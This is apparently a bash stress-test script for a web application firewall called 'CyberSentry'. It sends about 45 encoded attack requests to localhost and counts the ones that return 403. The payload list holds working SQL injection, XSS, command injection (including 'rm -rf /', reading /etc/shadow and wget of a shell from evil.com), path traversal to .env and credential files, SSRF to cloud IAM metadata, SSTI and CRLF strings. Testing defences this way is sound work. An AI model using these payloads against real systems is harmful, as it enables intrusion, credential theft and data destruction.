#!/bin/bash
BASE="http://localhost:8000"
BLOCKED=0
ALLOWED=0
TOTAL=0

run_test() {
  local name="$1"
  local url="$2"
  TOTAL=$((TOTAL+1))
  response=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
  if [ "$response" = "403" ]; then
    BLOCKED=$((BLOCKED+1))
    echo "✅ BLOCKED [$response] $name"
  else
    ALLOWED=$((ALLOWED+1))
    echo "❌ PASSED  [$response] $name"
  fi
}

echo ""
echo "=================================================="
echo "  CyberSentry Stress Test — 50 Attack Vectors"
echo "=================================================="
echo ""

echo "── SQL Injection ──────────────────────────────"
run_test "SQLi tautology"           "$BASE/search?q=%27+OR+1%3D1--"
run_test "SQLi UNION extraction"    "$BASE/user?id=1+UNION+SELECT+*+FROM+users--"
run_test "SQLi comment bypass"      "$BASE/search?q=admin%27--"
run_test "SQLi time-based"          "$BASE/search?q=1+AND+SLEEP%285%29--"
run_test "SQLi stacked queries"     "$BASE/search?q=1%3BDROP+TABLE+users--"
run_test "SQLi schema enum"         "$BASE/search?q=1+AND+1%3D1+UNION+SELECT+table_name+FROM+information_schema.tables--"
run_test "SQLi error-based"         "$BASE/search?q=1+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2C%28SELECT+version%28%29%29%29%29--"
run_test "SQLi boolean blind"       "$BASE/search?q=1+AND+%281%3D1%29--"

echo ""
echo "── Cross-Site Scripting ───────────────────────"
run_test "XSS script tag"           "$BASE/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
run_test "XSS img onerror"          "$BASE/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E"
run_test "XSS svg onload"           "$BASE/search?q=%3Csvg+onload%3Dalert%281%29%3E"
run_test "XSS javascript proto"     "$BASE/search?q=javascript%3Aalert%281%29"
run_test "XSS cookie theft"         "$BASE/search?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E"
run_test "XSS event handler"        "$BASE/search?q=%3Cp+onclick%3Dalert%281%29%3E"
run_test "XSS iframe srcdoc"        "$BASE/search?q=%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E"

echo ""
echo "── Command Injection ──────────────────────────"
run_test "CMDi semicolon"           "$BASE/ping?host=localhost%3B+id"
run_test "CMDi pipe"                "$BASE/ping?host=localhost+%7C+cat+%2Fetc%2Fpasswd"
run_test "CMDi backtick"            "$BASE/ping?host=%60whoami%60"
run_test "CMDi dollar paren"        "$BASE/ping?host=%24%28id%29"
run_test "CMDi rm -rf"              "$BASE/ping?host=localhost%3B+rm+-rf+%2F"
run_test "CMDi wget shell"          "$BASE/ping?host=localhost%3B+wget+http%3A%2F%2Fevil.com%2Fshell.sh"
run_test "CMDi cat shadow"          "$BASE/ping?host=localhost%3B+cat+%2Fetc%2Fshadow"

echo ""
echo "── Path Traversal ─────────────────────────────"
run_test "Path ../../../etc/passwd" "$BASE/file?name=..%2F..%2F..%2Fetc%2Fpasswd"
run_test "Path encoded"             "$BASE/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
run_test "Path windows"             "$BASE/file?name=..%5C..%5Cwindows%5Cwin.ini"
run_test "Path .env file"           "$BASE/file?name=..%2F..%2F.env"
run_test "Path git config"          "$BASE/file?name=..%2F..%2F.git%2Fconfig"
run_test "Path proc environ"        "$BASE/file?name=..%2F..%2Fproc%2Fself%2Fenviron"
run_test "Path double encoded"      "$BASE/file?name=....%2F%2F....%2F%2Fetc%2Fpasswd"

echo ""
echo "── SSRF ───────────────────────────────────────"
run_test "SSRF AWS metadata"        "$BASE/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
run_test "SSRF AWS IAM creds"       "$BASE/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2F"
run_test "SSRF GCP metadata"        "$BASE/fetch?url=http%3A%2F%2Fmetadata.google.internal%2F"
run_test "SSRF localhost redis"     "$BASE/fetch?url=http%3A%2F%2Flocalhost%3A6379%2F"
run_test "SSRF file protocol"       "$BASE/fetch?url=file%3A%2F%2F%2Fetc%2Fpasswd"
run_test "SSRF 127.0.0.1"          "$BASE/fetch?url=http%3A%2F%2F127.0.0.1%3A8080%2Fadmin"
run_test "SSRF gopher protocol"     "$BASE/fetch?url=gopher%3A%2F%2Flocalhost%3A6379%2F"

echo ""
echo "── SSTI ───────────────────────────────────────"
run_test "SSTI Jinja2 probe"        "$BASE/search?q=%7B%7B7*7%7D%7D"
run_test "SSTI config dump"         "$BASE/search?q=%7B%7Bconfig.items%28%29%7D%7D"
run_test "SSTI RCE attempt"         "$BASE/search?q=%7B%7B%27%27.__class__.__mro__%7D%7D"
run_test "SSTI Freemarker"          "$BASE/search?q=%24%7B7*7%7D"
run_test "SSTI Velocity"            "$BASE/search?q=%23%7B7*7%7D"

echo ""
echo "── Header Injection ───────────────────────────"
run_test "Header CRLF inject"       "$BASE/search?q=test%0d%0aSet-Cookie%3A+evil%3D1"
run_test "Header response split"    "$BASE/search?q=test%0aContent-Length%3A+0"

echo ""
echo "── Clean requests (should PASS) ───────────────"
run_test "Clean search"             "$BASE/search?q=python+security"
run_test "Clean user lookup"        "$BASE/user?id=42"
run_test "Clean file read"          "$BASE/file?name=readme.txt"
run_test "Clean ping"               "$BASE/ping?host=google.com"
run_test "Clean fetch"              "$BASE/fetch?url=https%3A%2F%2Fexample.com"

echo ""
echo "=================================================="
echo "  RESULTS"
echo "=================================================="
echo "  Total tests : $TOTAL"
echo "  Blocked     : $BLOCKED"
echo "  Passed      : $ALLOWED"

DETECTION_RATE=$(echo "scale=1; $BLOCKED * 100 / ($TOTAL - 5)" | bc 2>/dev/null || echo "~90")
echo "  Detection   : ${DETECTION_RATE}% of attacks caught"
echo "=================================================="
